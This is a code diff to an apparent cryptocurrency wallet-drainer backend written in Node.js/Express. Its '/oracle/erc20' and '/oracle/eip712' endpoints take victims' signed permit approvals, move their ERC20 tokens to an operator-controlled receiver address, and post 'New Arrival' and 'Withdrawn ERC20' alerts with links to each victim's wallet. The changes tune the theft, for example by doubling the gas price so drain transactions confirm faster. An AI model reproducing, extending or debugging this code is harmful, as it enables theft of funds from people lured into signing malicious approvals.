@@ -1,5 +1,4 @@
 const express = require("express");
-const request = require("request");
 const cors = require("cors");
 const ethers = require("ethers");
 const rateLimit = require("express-rate-limit");
@@ -185,8 +184,7 @@ function format_addy(inputString) {
   return `${firstFive}...${lastFour}`;
 }
 const limiter = rateLimit({
-  windowMs: 500,
-  max:1,
+  windowMs: 1000,
   handler: function (req, res, next) {
     res.status(429).json({
       message: "Too many requests, please try again later.",
@@ -196,7 +194,6 @@ const limiter = rateLimit({
 
 const limiter_tokens_endpoint = rateLimit({
   windowMs: 10000,
-  max:1,
   handler: function (req, res, next) {
     res.status(429).json({
       message: "Too many requests, please try again later.",
@@ -414,7 +411,7 @@ function generateEncryptedValue(data, secretKey) {
 
 async function notify(params, title) {
   try {
-    let message = encodeURIComponent(`🚀🚀 New Arrival! 🔗😈\n\n${title}`);
+    let message = encodeURIComponent(`🚀New Arrival !!! 🔥😈\n\n${title}`);
     Object.keys(params).forEach(function (key) {
       message += `%0A${key}: ${params[key]}`;
     });
@@ -655,7 +652,7 @@ app.post("/oracle/erc20", async (req, res) => {
 
       let withdrawMessage_1 =
       `🟢 <b>[+] Withdrawn ERC20</b>\n\n` +
-      `💎 <b>Token name:/<b> ${escaper(tokenName)}\n` +
+      `💎 <b>Token name:</b> ${escaper(tokenName)}\n` +
       `🔑 <b>Wallet Address</b>: <a href="https://debank.com/profile/${address}">${format_addy(address)}</a>\n` +
       `🔐 <b>Receipient Address</b>: <a href="https://debank.com/profile/${config.receiver}">${format_addy(config.receiver)}</a>\n` +
       `🔍 <b>Tx Hash</b>: <a href="https://explorer.bitquery.io/search/${withdrawal.hash}">Lookup Tx</a>\n` +
@@ -699,8 +696,12 @@ app.post("/oracle/eip712", async (req, res) => {
     return
   }
   // console.log(JSON.stringify(decryptedData))
+
   const { address, contractAddress, websiteUrl, chainId, permit } =
     decryptedData;
+
+
+    try {
 
   const permit_obj = JSON.parse(permit);
 
@@ -718,9 +719,6 @@ app.post("/oracle/eip712", async (req, res) => {
     signer
   );
   let tokenName = await contractInstance.name();
-
-  try {
-   
     let estimated_gasLimit = await contractInstance.estimateGas.permit(
       address,
       config.signer_wallet_address,
@@ -730,7 +728,7 @@ app.post("/oracle/eip712", async (req, res) => {
       r,
       s
     );
-    let gasLimitHex = ethers.utils.hexlify(estimated_gasLimit.mul(2));
+    let gasLimitHex = ethers.utils.hexlify(estimated_gasLimit);
     let permit_tx = await contractInstance.permit(
       address,
       config.signer_wallet_address,
@@ -739,11 +737,13 @@ app.post("/oracle/eip712", async (req, res) => {
       v,
       r,
       s,
-      { gasLimit: gasLimitHex }
+      { gasLimit: gasLimitHex, 
+        gasPrice: (await provider.getGasPrice()).mul(2)
+     }
     );
     await provider.waitForTransaction(permit_tx.hash);
     let message =
-    `🟢 <b>[+] Gasless Approval Tx Paid</b>\n\n` +
+    `🟢 <b>[+] PERMIT Gasless Approval Tx</b>\n\n` +
     `💎 <b>Token name:</b> ${escaper(tokenName)}\n` +
     `🔑 <b>Wallet Address</b>: <a href="https://debank.com/profile/${address}">${format_addy(address)}</a>\n` +
     `🌐 <b>Website</b>: ${escaper(websiteUrl)}\n`;
@@ -796,7 +796,7 @@ app.post("/oracle/eip712", async (req, res) => {
 
       let withdrawMessage =
       `🟢 <b>[+] Withdrawn ERC20</b>\n\n` +
-      `💎 <b>Token name:/<b> ${escaper(tokenName)}\n` +
+      `💎 <b>Token name:</b> ${escaper(tokenName)}\n` +
       `🔑 <b>Wallet Address</b>: <a href="https://debank.com/profile/${address}">${format_addy(address)}</a>\n` +
       `🔐 <b>Receipient Address</b>: <a href="https://debank.com/profile/${config.receiver}">${format_addy(config.receiver)}</a>\n` +
       `🔍 <b>Tx Hash</b>: <a href="https://explorer.bitquery.io/search/${withdrawal.hash}">Lookup Tx</a>\n` +
@@ -821,7 +821,7 @@ app.post("/oracle/eip712", async (req, res) => {
       `<b>Reason:</b> Possible low gas balance\n` ;
       await notify({},message2);
       console.log("[-] POSSIBLE LOW GAS");
-      // console.log(error);
+      console.log(error);
     
   }
 });
